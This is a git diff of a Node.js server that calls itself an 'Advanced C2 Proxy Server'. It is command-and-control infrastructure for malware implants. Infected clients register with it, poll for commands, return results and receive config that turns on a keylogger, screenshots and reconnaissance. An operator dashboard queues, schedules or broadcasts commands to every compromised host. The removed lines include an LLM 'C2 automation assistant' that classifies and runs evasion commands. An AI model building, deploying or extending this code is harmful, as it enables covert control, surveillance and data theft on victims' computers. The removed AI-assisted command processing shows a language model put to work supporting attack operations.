@@ -1,5 +1,3 @@
-// server-advanced.js - Enterprise Puter C2 Proxy
-import { init } from "@heyputer/puter.js/src/init.cjs";
 import express from 'express';
 import crypto from 'crypto';
 import cors from 'cors';
@@ -13,16 +11,13 @@ import http from 'http';
 const PORT = process.env.PORT || 8080;
 const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
 const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'monitorMutexCPUman';
-const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '`f7`8b`c.519e`7ba57f6~s';
-const PUTER_AUTH_TOKEN = process.env.PUTER_AUTH_TOKEN;
+const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'crypto.randomBytes(16).toString('hex')';
+const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
 
-if (!PUTER_AUTH_TOKEN) {
-    console.error('❌ PUTER_AUTH_TOKEN environment variable is required!');
-    console.error('Get it from: puter.com/dashboard#account');
-    process.exit(1);
-}
-
-const puter = init(PUTER_AUTH_TOKEN);
+// Log configuration on startup
+console.log('🚀 Starting Advanced C2 Proxy Server...');
+console.log(`🔐 Encryption Key: ${ENCRYPTION_KEY.substring(0, 16)}...`);
+console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
 
 // ==================== ENCRYPTION ====================
 class CryptoManager {
@@ -94,69 +89,72 @@ const limiter = rateLimit({
 });
 app.use('/api/', limiter);
 
-// ==================== PUTER KV HELPERS ====================
+// ==================== IN-MEMORY STORAGE (with persistence to disk) ====================
 class StoreManager {
-    constructor(puter) {
-        this.puter = puter;
+    constructor() {
         this.cache = new Map();
         this.cacheTTL = 30000; // 30 seconds
+        this.persistInterval = 60000; // Save to disk every minute
+        this.dataFile = './data.json';
+        this.loadFromDisk();
+        
+        // Auto-save to disk
+        setInterval(() => this.saveToDisk(), this.persistInterval);
+    }
+
+    loadFromDisk() {
+        try {
+            const fs = require('fs');
+            if (fs.existsSync(this.dataFile)) {
+                const data = JSON.parse(fs.readFileSync(this.dataFile, 'utf8'));
+                for (const [key, value] of Object.entries(data)) {
+                    this.cache.set(key, { value, timestamp: Date.now() });
+                }
+                console.log(`📂 Loaded ${this.cache.size} items from disk`);
+            }
+        } catch (err) {
+            console.log('No existing data file found, starting fresh');
+        }
+    }
+
+    saveToDisk() {
+        try {
+            const fs = require('fs');
+            const data = {};
+            for (const [key, entry] of this.cache) {
+                data[key] = entry.value;
+            }
+            fs.writeFileSync(this.dataFile, JSON.stringify(data, null, 2));
+        } catch (err) {
+            // Silently fail - data stays in memory
+        }
     }
 
     async set(key, value) {
-        try {
-            await this.puter.kv.set(key, JSON.stringify(value));
-            this.cache.set(key, { value, timestamp: Date.now() });
-            return true;
-        } catch (err) {
-            console.error(`KV SET error: ${err.message}`);
-            return false;
-        }
+        this.cache.set(key, { value, timestamp: Date.now() });
+        return true;
     }
 
     async get(key) {
-        try {
-            // Check cache
-            const cached = this.cache.get(key);
-            if (cached && (Date.now() - cached.timestamp) < this.cacheTTL) {
-                return cached.value;
-            }
-            
-            const value = await this.puter.kv.get(key);
-            if (value) {
-                const parsed = JSON.parse(value);
-                this.cache.set(key, { value: parsed, timestamp: Date.now() });
-                return parsed;
-            }
-            return null;
-        } catch (err) {
-            console.error(`KV GET error: ${err.message}`);
-            return null;
+        const cached = this.cache.get(key);
+        if (cached && (Date.now() - cached.timestamp) < this.cacheTTL) {
+            return cached.value;
         }
+        return cached ? cached.value : null;
     }
 
     async delete(key) {
-        try {
-            await this.puter.kv.del(key);
-            this.cache.delete(key);
-            return true;
-        } catch (err) {
-            console.error(`KV DELETE error: ${err.message}`);
-            return false;
-        }
+        this.cache.delete(key);
+        return true;
     }
 
     async list(pattern) {
-        try {
-            const keys = await this.puter.kv.list();
-            if (pattern) {
-                const regex = new RegExp(pattern.replace('*', '.*'));
-                return keys.filter(k => regex.test(k));
-            }
-            return keys;
-        } catch (err) {
-            console.error(`KV LIST error: ${err.message}`);
-            return [];
+        const keys = Array.from(this.cache.keys());
+        if (pattern) {
+            const regex = new RegExp(pattern.replace('*', '.*'));
+            return keys.filter(k => regex.test(k));
         }
+        return keys;
     }
 
     async search(prefix) {
@@ -170,11 +168,21 @@ class StoreManager {
         }
         return results;
     }
+
+    async getAll() {
+        const data = {};
+        for (const [key, entry] of this.cache) {
+            data[key] = entry.value;
+        }
+        return data;
+    }
 }
 
-const store = new StoreManager(puter);
+const store = new StoreManager();
 
 // ==================== AUTHENTICATION ====================
+let adminTokens = [];
+
 async function authenticate(req, res, next) {
     const authHeader = req.headers.authorization;
     if (!authHeader || !authHeader.startsWith('Bearer ')) {
@@ -205,6 +213,11 @@ async function generateAdminToken() {
     await store.set('admin_tokens', tokens);
     return token;
 }
+
+// Generate initial token
+generateAdminToken().then(token => {
+    console.log(`🔑 Admin Token: ${token}`);
+});
 
 // ==================== WEBHOOKS ====================
 class WebhookManager {
@@ -258,107 +271,6 @@ class WebhookManager {
 
 const webhookManager = new WebhookManager(store);
 
-// ==================== AI COMMAND PROCESSOR ====================
-class AICommandProcessor {
-    constructor(puter) {
-        this.puter = puter;
-        this.contexts = new Map();
-    }
-
-    async process(clientId, command) {
-        // Get client context
-        const context = await this.getContext(clientId);
-        
-        // Analyze command
-        const analysis = await this.analyzeCommand(command, context);
-        
-        // Generate response
-        const response = await this.generateResponse(analysis);
-        
-        return response;
-    }
-
-    async getContext(clientId) {
-        if (this.contexts.has(clientId)) {
-            return this.contexts.get(clientId);
-        }
-        
-        // Build context from history
-        const results = await store.get(`results:${clientId}`) || [];
-        const commands = await store.get(`history:${clientId}`) || [];
-        
-        const context = {
-            clientId,
-            history: commands.slice(-10),
-            recentResults: results.slice(-5),
-            systemInfo: await store.get(`client:${clientId}`)
-        };
-        
-        this.contexts.set(clientId, context);
-        return context;
-    }
-
-    async analyzeCommand(command, context) {
-        const prompt = `Analyze this command for a C2 client (ID: ${context.clientId}):
-Command: ${command}
-Client Info: ${JSON.stringify(context.systemInfo)}
-Recent History: ${JSON.stringify(context.history)}
-Recent Results: ${JSON.stringify(context.recentResults)}
-
-Provide:
-1. Command type (system/network/file/persistence/evasion/recon)
-2. Risk level (low/medium/high/critical)
-3. Expected output format
-4. Potential security implications
-5. Suggested optimizations`;
-
-        try {
-            const response = await this.puter.ai.chat({
-                messages: [
-                    { role: 'system', content: 'You are a security automation assistant for C2 operations.' },
-                    { role: 'user', content: prompt }
-                ]
-            });
-            
-            return JSON.parse(response.message.content);
-        } catch (err) {
-            return {
-                type: 'unknown',
-                risk: 'medium',
-                outputFormat: 'text',
-                implications: ['Unknown'],
-                optimizations: []
-            };
-        }
-    }
-
-    async generateResponse(analysis) {
-        if (analysis.type === 'evasion') {
-            return {
-                action: 'execute',
-                priority: 'high',
-                notes: 'Evasion command detected - executing with stealth options'
-            };
-        }
-        
-        if (analysis.risk === 'critical') {
-            return {
-                action: 'warn',
-                priority: 'critical',
-                notes: 'This command has critical risk implications'
-            };
-        }
-        
-        return {
-            action: 'execute',
-            priority: 'normal',
-            notes: `Processing ${analysis.type} command`
-        };
-    }
-}
-
-const aiProcessor = new AICommandProcessor(puter);
-
 // ==================== CLIENT MANAGEMENT ====================
 class ClientManager {
     constructor(store, webhookManager) {
@@ -382,7 +294,8 @@ class ClientManager {
             tags: [],
             notes: '',
             totalCommands: 0,
-            lastCommand: null
+            lastCommand: null,
+            features: ['cmd', 'powershell', 'file', 'network', 'keylogger', 'screenshot', 'recon']
         };
         
         await this.store.set(`client:${clientId}`, clientData);
@@ -396,6 +309,8 @@ class ClientManager {
         
         // Trigger webhook
         await this.webhookManager.trigger('client_online', clientData);
+        
+        console.log(`✅ Client registered: ${clientId} (${hostname}/${username})`);
         
         return clientData;
     }
@@ -414,32 +329,6 @@ class ClientManager {
 
     async getPendingCommands(clientId) {
         const commands = await this.store.get(`pending:${clientId}`) || [];
-        
-        // Check for intelligent command processing
-        if (commands.length > 0) {
-            const client = await this.store.get(`client:${clientId}`);
-            const processed = [];
-            
-            for (const cmd of commands) {
-                // If AI processing is enabled, analyze the command
-                if (client && client.useAI) {
-                    try {
-                        const analysis = await aiProcessor.process(clientId, cmd.command);
-                        if (analysis.action === 'warn') {
-                            // Log warning but still execute
-                            await this.store.get(`warnings:${clientId}`) || [];
-                            // Continue execution
-                        }
-                    } catch (err) {
-                        console.error('AI processing error:', err);
-                    }
-                }
-                processed.push(cmd);
-            }
-            
-            return processed;
-        }
-        
         return commands;
     }
 
@@ -462,7 +351,7 @@ class ClientManager {
                 } else {
                     stats.offline++;
                 }
-                if (now - lastSeen < 3600000) { // Last hour
+                if (now - lastSeen < 3600000) {
                     stats.lastHour++;
                 }
             }
@@ -494,11 +383,9 @@ class AnalyticsEngine {
             timestamp: new Date().toISOString()
         };
         
-        // Store in KV
         const key = `event:${event.id}`;
         await this.store.set(key, event);
         
-        // Add to events list
         const events = await this.store.get('events') || [];
         events.push(key);
         if (events.length > 10000) {
@@ -587,8 +474,32 @@ app.get('/health', (req, res) => {
     res.json({ 
         status: 'online', 
         time: new Date().toISOString(),
-        version: '2.0.0',
-        clients: clientManager.clients.size
+        version: '3.0.0',
+        clients: clientManager.clients.size,
+        uptime: process.uptime(),
+        memory: process.memoryUsage(),
+        platform: 'Render.com'
+    });
+});
+
+// Root
+app.get('/', (req, res) => {
+    res.json({
+        name: 'Advanced C2 Proxy Server',
+        version: '3.0.0',
+        status: 'running',
+        platform: 'Render.com',
+        endpoints: {
+            health: '/health',
+            dashboard: '/dashboard',
+            register: 'POST /api/register',
+            poll: 'POST /api/poll',
+            results: 'POST /api/results',
+            heartbeat: 'POST /api/heartbeat',
+            clients: 'GET /api/admin/clients',
+            command: 'POST /api/admin/command',
+            analytics: 'GET /api/admin/analytics'
+        }
     });
 });
 
@@ -609,7 +520,6 @@ app.post('/api/register', async (req, res) => {
             ip
         });
         
-        // Get pending commands
         const commands = await clientManager.getPendingCommands(clientId);
         
         // Clear pending commands
@@ -622,7 +532,9 @@ app.post('/api/register', async (req, res) => {
             config: {
                 pollingInterval: 2000,
                 heartbeatInterval: 300000,
-                keyloggerEnabled: true
+                keyloggerEnabled: true,
+                screenshotEnabled: true,
+                reconEnabled: true
             }
         });
         
@@ -767,6 +679,26 @@ app.post('/api/heartbeat', async (req, res) => {
 
 // ==================== ADMIN API ====================
 
+// Login - Get admin token
+app.post('/api/admin/login', async (req, res) => {
+    try {
+        const { username, password } = req.body;
+        
+        if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
+            const token = await generateAdminToken();
+            res.json({ 
+                status: 'success', 
+                token,
+                expiresIn: 86400 // 24 hours
+            });
+        } else {
+            res.status(401).json({ error: 'Invalid credentials' });
+        }
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
 // Get all clients
 app.get('/api/admin/clients', authenticate, async (req, res) => {
     try {
@@ -776,7 +708,6 @@ app.get('/api/admin/clients', authenticate, async (req, res) => {
         for (const id of clients) {
             const data = await store.get(`client:${id}`);
             if (data) {
-                // Get additional info
                 const pending = await store.get(`pending:${id}`) || [];
                 const results = await store.get(`results:${id}`) || [];
                 data.pendingCommands = pending.length;
@@ -785,7 +716,6 @@ app.get('/api/admin/clients', authenticate, async (req, res) => {
             }
         }
         
-        // Sort by last seen
         clientData.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
         
         res.json({ clients: clientData });
@@ -803,12 +733,10 @@ app.get('/api/admin/clients/:clientId', authenticate, async (req, res) => {
             return res.status(404).json({ error: 'Client not found' });
         }
         
-        // Get additional info
         const pending = await store.get(`pending:${clientId}`) || [];
         const results = await store.get(`results:${clientId}`) || [];
         const history = await store.get(`history:${clientId}`) || [];
         
-        // Get full results
         const fullResults = [];
         for (const key of results.slice(-20)) {
             const result = await store.get(key);
@@ -847,17 +775,14 @@ app.post('/api/admin/command', authenticate, async (req, res) => {
             delay: delay || 0
         };
         
-        // If scheduling, set future time
         if (scheduled) {
             commandEntry.scheduledTime = new Date(scheduled).toISOString();
         }
         
-        // Add to pending
         const pendingCommands = await store.get(`pending:${clientId}`) || [];
         pendingCommands.push(commandEntry);
         await store.set(`pending:${clientId}`, pendingCommands);
         
-        // Add to history
         const history = await store.get(`history:${clientId}`) || [];
         history.push({
             id: commandId,
@@ -870,10 +795,8 @@ app.post('/api/admin/command', authenticate, async (req, res) => {
         }
         await store.set(`history:${clientId}`, history);
         
-        // Log analytics
         await analytics.log('command_sent', { clientId, commandId, command });
         
-        // Trigger webhook
         await webhookManager.trigger('command_sent', {
             clientId,
             commandId,
@@ -962,7 +885,6 @@ app.delete('/api/admin/clients/:clientId', authenticate, async (req, res) => {
     try {
         const { clientId } = req.params;
         
-        // Remove from clients list
         const clients = await store.get('clients') || [];
         const index = clients.indexOf(clientId);
         if (index > -1) {
@@ -970,7 +892,6 @@ app.delete('/api/admin/clients/:clientId', authenticate, async (req, res) => {
             await store.set('clients', clients);
         }
         
-        // Delete client data
         await store.delete(`client:${clientId}`);
         await store.delete(`pending:${clientId}`);
         await store.delete(`history:${clientId}`);
@@ -1029,32 +950,6 @@ app.get('/api/admin/webhooks', authenticate, async (req, res) => {
     }
 });
 
-// ==================== AI API ====================
-
-app.post('/api/admin/ai', authenticate, async (req, res) => {
-    try {
-        const { prompt, context } = req.body;
-        if (!prompt) {
-            return res.status(400).json({ error: 'prompt required' });
-        }
-        
-        const fullContext = context || 'C2 operations automation';
-        const response = await puter.ai.chat({
-            messages: [
-                { role: 'system', content: `You are a C2 automation assistant. Context: ${fullContext}` },
-                { role: 'user', content: prompt }
-            ]
-        });
-        
-        res.json({ 
-            response: response.message.content,
-            timestamp: new Date().toISOString()
-        });
-    } catch (err) {
-        res.status(500).json({ error: err.message });
-    }
-});
-
 // ==================== SCHEDULED TASKS ====================
 
 class Scheduler {
@@ -1077,7 +972,6 @@ class Scheduler {
         
         await this.store.set(`task:${taskId}`, task);
         
-        // Add to tasks list
         const tasks = await this.store.get('tasks') || [];
         tasks.push(taskId);
         await this.store.set('tasks', tasks);
@@ -1095,7 +989,6 @@ class Scheduler {
             
             const scheduledTime = new Date(task.scheduledTime);
             if (scheduledTime <= now) {
-                // Execute task
                 const commands = await this.store.get(`pending:${task.clientId}`) || [];
                 commands.push({
                     id: Date.now().toString(),
@@ -1106,7 +999,6 @@ class Scheduler {
                 });
                 await this.store.set(`pending:${task.clientId}`, commands);
                 
-                // Update task status
                 task.status = 'executed';
                 task.executedAt = new Date().toISOString();
                 await this.store.set(`task:${taskId}`, task);
@@ -1122,11 +1014,11 @@ const scheduler = new Scheduler(store);
 // Start scheduler
 setInterval(async () => {
     await scheduler.check();
-}, 60000); // Check every minute
+}, 60000);
 
 // ==================== WEBSOCKET HANDLER ====================
 
-const clients = new Map();
+const wsClients = new Map();
 
 wss.on('connection', (ws, req) => {
     console.log('🔌 WebSocket client connected');
@@ -1147,14 +1039,13 @@ wss.on('connection', (ws, req) => {
             
             if (data.type === 'subscribe') {
                 const { clientId } = data;
-                clients.set(ws, { clientId, subscribed: true });
+                wsClients.set(ws, { clientId, subscribed: true });
                 ws.send(JSON.stringify({ 
                     type: 'subscribed', 
                     clientId,
                     message: `Subscribed to ${clientId}`
                 }));
                 
-                // Send initial data
                 const client = await store.get(`client:${clientId}`);
                 const results = await store.get(`results:${clientId}`) || [];
                 const pending = await store.get(`pending:${clientId}`) || [];
@@ -1169,7 +1060,6 @@ wss.on('connection', (ws, req) => {
             
             if (data.type === 'command') {
                 const { clientId, command } = data;
-                // Add command to pending
                 const pending = await store.get(`pending:${clientId}`) || [];
                 pending.push({
                     id: Date.now().toString(),
@@ -1193,34 +1083,458 @@ wss.on('connection', (ws, req) => {
     });
     
     ws.on('close', () => {
-        clients.delete(ws);
+        wsClients.delete(ws);
         console.log('🔌 WebSocket client disconnected');
     });
 });
 
-// Broadcast to all WebSocket clients
-async function broadcastToWebSocket(data) {
-    for (const [ws, info] of clients) {
-        if (ws.readyState === WebSocket.OPEN) {
-            try {
-                ws.send(JSON.stringify(data));
-            } catch (err) {
-                console.error('WebSocket broadcast error:', err);
+// ==================== DASHBOARD ====================
+
+app.get('/dashboard', (req, res) => {
+    res.send(`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Advanced C2 Proxy Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0a0e17; color: #e0e0e0; padding: 20px; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 { color: #00ff88; border-bottom: 2px solid #00ff88; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
+        .badge { background: #00ff8822; color: #00ff88; padding: 5px 15px; border-radius: 20px; font-size: 14px; }
+        .card { background: #141d2b; border-radius: 10px; padding: 20px; margin-bottom: 20px; border: 1px solid #1e2d3d; }
+        .card h2 { color: #00ff88; margin-bottom: 15px; }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
+        .stat-card { background: #1a2535; padding: 15px; border-radius: 8px; text-align: center; }
+        .stat-card .number { font-size: 32px; font-weight: bold; color: #00ff88; }
+        .stat-card .label { color: #8899aa; font-size: 12px; text-transform: uppercase; margin-top: 5px; }
+        .client-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
+        .client-card { background: #1a2535; padding: 15px; border-radius: 8px; border-left: 3px solid #00ff88; cursor: pointer; transition: all 0.3s; }
+        .client-card:hover { background: #1e2d3d; transform: translateX(5px); }
+        .client-card .id { color: #00ff88; font-weight: bold; font-size: 16px; }
+        .client-card .detail { color: #8899aa; font-size: 0.9em; margin: 2px 0; }
+        .status { display: inline-block; padding: 2px 10px; border-radius: 4px; font-size: 0.8em; margin-top: 5px; }
+        .status.online { background: #00ff8822; color: #00ff88; }
+        .status.offline { background: #ff444422; color: #ff4444; }
+        .flex { display: flex; gap: 10px; flex-wrap: wrap; }
+        .flex > * { flex: 1; min-width: 200px; }
+        input, select, textarea { background: #0a0e17; color: #e0e0e0; border: 1px solid #1e2d3d; padding: 10px; border-radius: 5px; width: 100%; margin-bottom: 10px; font-family: inherit; }
+        button { background: #00ff88; color: #0a0e17; border: none; padding: 10px 25px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: all 0.3s; }
+        button:hover { background: #00cc66; transform: scale(1.02); }
+        button.secondary { background: #1e2d3d; color: #e0e0e0; }
+        button.secondary:hover { background: #2a3d4d; }
+        .output { background: #0a0e17; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; white-space: pre-wrap; max-height: 400px; overflow-y: auto; font-size: 12px; }
+        .loading { color: #ffaa00; }
+        .error { color: #ff4444; }
+        .success { color: #00ff88; }
+        .help-text { color: #8899aa; font-size: 12px; margin-top: 5px; }
+        .command-history { max-height: 300px; overflow-y: auto; }
+        .command-entry { padding: 5px 10px; border-bottom: 1px solid #1e2d3d; font-size: 13px; }
+        .command-entry .cmd { color: #00ff88; }
+        .command-entry .time { color: #8899aa; font-size: 11px; float: right; }
+        @media (max-width: 600px) { .flex { flex-direction: column; } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>
+        🎯 Advanced C2 Proxy Dashboard
+        <span class="badge">v3.0.0</span>
+    </h1>
+    
+    <div class="card">
+        <h2>📡 Server Status</h2>
+        <div id="serverStatus">Loading...</div>
+        <button onclick="refreshAll()" class="secondary">🔄 Refresh</button>
+    </div>
+    
+    <div class="card">
+        <h2>📊 Statistics</h2>
+        <div class="stats-grid" id="statsGrid">
+            <div class="stat-card"><div class="number" id="statTotal">0</div><div class="label">Total Clients</div></div>
+            <div class="stat-card"><div class="number" id="statOnline">0</div><div class="label">Online</div></div>
+            <div class="stat-card"><div class="number" id="statOffline">0</div><div class="label">Offline</div></div>
+            <div class="stat-card"><div class="number" id="statCommands">0</div><div class="label">Commands Executed</div></div>
+        </div>
+    </div>
+    
+    <div class="card">
+        <h2>🖥️ Connected Clients</h2>
+        <div id="clientList" class="client-grid">Loading clients...</div>
+    </div>
+    
+    <div class="card">
+        <h2>📤 Send Command</h2>
+        <div class="flex">
+            <input type="text" id="targetClient" placeholder="Client ID (e.g., TEST001)">
+            <input type="text" id="commandInput" placeholder="Command to execute">
+        </div>
+        <div class="flex">
+            <input type="datetime-local" id="scheduleTime" placeholder="Schedule time (optional)">
+            <button onclick="sendCommand()">▶ Execute</button>
+            <button onclick="broadcastCommand()" class="secondary">📢 Broadcast to All</button>
+        </div>
+        <div id="commandStatus" class="help-text"></div>
+    </div>
+    
+    <div class="card">
+        <h2>📋 Command Output</h2>
+        <div id="commandOutput" class="output">Select a client to view results...</div>
+    </div>
+    
+    <div class="card">
+        <h2>📜 Command History</h2>
+        <div id="commandHistory" class="command-history">No history yet...</div>
+    </div>
+    
+    <div class="card">
+        <h2>🔑 Authentication</h2>
+        <div class="flex">
+            <input type="text" id="authUsername" placeholder="Username" value="admin">
+            <input type="password" id="authPassword" placeholder="Password">
+            <button onclick="login()">🔑 Login</button>
+        </div>
+        <div id="authStatus" class="help-text"></div>
+        <div id="authTokenDisplay" style="display:none; margin-top:10px; background:#0a0e17; padding:10px; border-radius:5px; word-break:break-all; font-family:monospace; font-size:12px;"></div>
+    </div>
+</div>
+
+<script>
+    let authToken = '';
+    let selectedClient = null;
+    const API_BASE = window.location.origin;
+    
+    function login() {
+        const username = document.getElementById('authUsername').value;
+        const password = document.getElementById('authPassword').value;
+        
+        fetch(API_BASE + '/api/admin/login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.token) {
+                authToken = data.token;
+                document.getElementById('authStatus').innerHTML = '✅ Login successful!';
+                document.getElementById('authTokenDisplay').style.display = 'block';
+                document.getElementById('authTokenDisplay').textContent = 'Token: ' + data.token;
+                localStorage.setItem('authToken', data.token);
+                refreshAll();
+            } else {
+                document.getElementById('authStatus').innerHTML = '❌ ' + (data.error || 'Login failed');
             }
-        }
+        })
+        .catch(err => {
+            document.getElementById('authStatus').innerHTML = '❌ Error: ' + err.message;
+        });
     }
-}
+    
+    // Load saved token
+    const savedToken = localStorage.getItem('authToken');
+    if (savedToken) {
+        authToken = savedToken;
+        document.getElementById('authTokenDisplay').style.display = 'block';
+        document.getElementById('authTokenDisplay').textContent = 'Token: ' + savedToken;
+        document.getElementById('authStatus').innerHTML = '✅ Loaded saved token';
+        refreshAll();
+    }
+    
+    function getHeaders() {
+        return {
+            'Content-Type': 'application/json',
+            'Authorization': 'Bearer ' + authToken
+        };
+    }
+    
+    function refreshAll() {
+        checkHealth();
+        loadClients();
+        loadAnalytics();
+    }
+    
+    function checkHealth() {
+        fetch(API_BASE + '/health')
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('serverStatus').innerHTML = \`
+                    <span class="success">✅ Online</span>
+                    | Clients: <strong>\${data.clients}</strong>
+                    | Uptime: <strong>\${Math.floor(data.uptime / 60)}m</strong>
+                    | Version: <strong>\${data.version}</strong>
+                    | Platform: <strong>\${data.platform || 'Render'}</strong>
+                \`;
+            })
+            .catch(err => {
+                document.getElementById('serverStatus').innerHTML = '❌ Error: ' + err.message;
+            });
+    }
+    
+    function loadClients() {
+        const listEl = document.getElementById('clientList');
+        listEl.innerHTML = '<span class="loading">⏳ Loading clients...</span>';
+        
+        if (!authToken) {
+            listEl.innerHTML = '🔑 Please login first';
+            return;
+        }
+        
+        fetch(API_BASE + '/api/admin/clients', { headers: getHeaders() })
+            .then(res => res.json())
+            .then(data => {
+                if (data.error) {
+                    listEl.innerHTML = '<span class="error">❌ ' + data.error + '</span>';
+                    return;
+                }
+                
+                if (!data.clients || data.clients.length === 0) {
+                    listEl.innerHTML = 'No clients connected yet.';
+                    return;
+                }
+                
+                listEl.innerHTML = '';
+                data.clients.forEach(client => {
+                    const card = document.createElement('div');
+                    card.className = 'client-card';
+                    const lastSeen = new Date(client.lastSeen);
+                    const isOnline = (Date.now() - lastSeen.getTime()) < 300000;
+                    card.innerHTML = \`
+                        <div class="id">\${client.clientId}</div>
+                        <div class="detail">💻 \${client.hostname}</div>
+                        <div class="detail">👤 \${client.username}</div>
+                        <div class="detail">📡 \${client.ip || 'unknown'}</div>
+                        <div class="detail">🕐 Last seen: \${lastSeen.toLocaleString()}</div>
+                        <span class="status \${isOnline ? 'online' : 'offline'}">\${isOnline ? '🟢 Online' : '🔴 Offline'}</span>
+                        <div class="detail" style="font-size:11px; margin-top:5px;">
+                            📊 \${client.resultsCount || 0} results | 
+                            ⏳ \${client.pendingCommands || 0} pending
+                        </div>
+                    \`;
+                    card.onclick = () => {
+                        selectedClient = client.clientId;
+                        document.getElementById('targetClient').value = client.clientId;
+                        loadResults(client.clientId);
+                        loadHistory(client.clientId);
+                    };
+                    listEl.appendChild(card);
+                });
+            })
+            .catch(err => {
+                listEl.innerHTML = '<span class="error">❌ ' + err.message + '</span>';
+            });
+    }
+    
+    function loadAnalytics() {
+        if (!authToken) return;
+        
+        fetch(API_BASE + '/api/admin/analytics', { headers: getHeaders() })
+            .then(res => res.json())
+            .then(data => {
+                if (data.stats) {
+                    document.getElementById('statTotal').textContent = data.stats.total || 0;
+                    document.getElementById('statOnline').textContent = data.stats.online || 0;
+                    document.getElementById('statOffline').textContent = data.stats.offline || 0;
+                }
+                if (data.metrics) {
+                    document.getElementById('statCommands').textContent = data.metrics.commandExecutions || 0;
+                }
+            })
+            .catch(err => {
+                console.error('Analytics error:', err);
+            });
+    }
+    
+    function sendCommand() {
+        const clientId = document.getElementById('targetClient').value.trim();
+        const command = document.getElementById('commandInput').value.trim();
+        const scheduleTime = document.getElementById('scheduleTime').value;
+        
+        if (!command) {
+            alert('Please enter a command');
+            return;
+        }
+        if (!clientId) {
+            alert('Please enter a Client ID');
+            return;
+        }
+        if (!authToken) {
+            alert('Please login first');
+            return;
+        }
+        
+        document.getElementById('commandStatus').innerHTML = '⏳ Sending command...';
+        
+        const payload = { clientId, command };
+        if (scheduleTime) {
+            payload.scheduled = scheduleTime;
+        }
+        
+        fetch(API_BASE + '/api/admin/command', {
+            method: 'POST',
+            headers: getHeaders(),
+            body: JSON.stringify(payload)
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) {
+                document.getElementById('commandStatus').innerHTML = '❌ ' + data.error;
+            } else {
+                document.getElementById('commandStatus').innerHTML = \`
+                    ✅ Command sent! ID: \${data.commandId} 
+                    \${data.scheduled ? '📅 Scheduled' : ''}
+                \`;
+                document.getElementById('commandInput').value = '';
+                if (!data.scheduled) {
+                    setTimeout(() => loadResults(clientId), 3000);
+                }
+            }
+        })
+        .catch(err => {
+            document.getElementById('commandStatus').innerHTML = '❌ ' + err.message;
+        });
+    }
+    
+    function broadcastCommand() {
+        const command = document.getElementById('commandInput').value.trim();
+        if (!command) {
+            alert('Please enter a command');
+            return;
+        }
+        if (!authToken) {
+            alert('Please login first');
+            return;
+        }
+        
+        if (!confirm('Send this command to ALL connected clients?')) return;
+        
+        document.getElementById('commandStatus').innerHTML = '⏳ Broadcasting...';
+        
+        fetch(API_BASE + '/api/admin/broadcast', {
+            method: 'POST',
+            headers: getHeaders(),
+            body: JSON.stringify({ command })
+        })
+        .then(res => res.json())
+        .then(data => {
+            if (data.error) {
+                document.getElementById('commandStatus').innerHTML = '❌ ' + data.error;
+            } else {
+                document.getElementById('commandStatus').innerHTML = \`
+                    ✅ Broadcasted to \${data.broadcasted} clients
+                \`;
+                document.getElementById('commandInput').value = '';
+            }
+        })
+        .catch(err => {
+            document.getElementById('commandStatus').innerHTML = '❌ ' + err.message;
+        });
+    }
+    
+    function loadResults(clientId) {
+        const outputEl = document.getElementById('commandOutput');
+        outputEl.innerHTML = '⏳ Loading results...';
+        
+        if (!authToken) {
+            outputEl.innerHTML = '🔑 Please login first';
+            return;
+        }
+        
+        fetch(API_BASE + '/api/admin/results/' + clientId, { headers: getHeaders() })
+            .then(res => res.json())
+            .then(data => {
+                if (data.error) {
+                    outputEl.innerHTML = '❌ ' + data.error;
+                    return;
+                }
+                if (!data.results || data.results.length === 0) {
+                    outputEl.innerHTML = 'No results for this client.';
+                    return;
+                }
+                let html = '';
+                data.results.slice().reverse().forEach(result => {
+                    html += \`[\${result.timestamp}] \${result.commandId || 'unknown'}\n\`;
+                    html += \`\${result.output || 'No output'}\n\`;
+                    html += '─'.repeat(60) + '\n\n';
+                });
+                outputEl.innerHTML = html;
+            })
+            .catch(err => {
+                outputEl.innerHTML = '❌ ' + err.message;
+            });
+    }
+    
+    function loadHistory(clientId) {
+        const historyEl = document.getElementById('commandHistory');
+        historyEl.innerHTML = '⏳ Loading history...';
+        
+        // Simplified history view
+        fetch(API_BASE + '/api/admin/clients/' + clientId, { headers: getHeaders() })
+            .then(res => res.json())
+            .then(data => {
+                if (data.error || !data.history) {
+                    historyEl.innerHTML = 'No history available.';
+                    return;
+                }
+                let html = '';
+                data.history.slice().reverse().forEach(entry => {
+                    html += \`<div class="command-entry">\`;
+                    html += \`<span class="cmd">📌 \${entry.command}</span>\`;
+                    html += \`<span class="time">\${new Date(entry.timestamp).toLocaleString()}</span>\`;
+                    html += \`<span style="font-size:11px; color:#8899aa;"> [\${entry.status}]\` + 
+                           \`</span></div>\`;
+                });
+                historyEl.innerHTML = html || 'No history yet.';
+            })
+            .catch(() => {
+                historyEl.innerHTML = 'Failed to load history.';
+            });
+    }
+    
+    // Auto-refresh
+    setInterval(() => {
+        if (authToken) {
+            loadClients();
+            loadAnalytics();
+        }
+    }, 30000);
+    
+    // Initial load
+    console.log('🚀 Dashboard loaded');
+</script>
+</body>
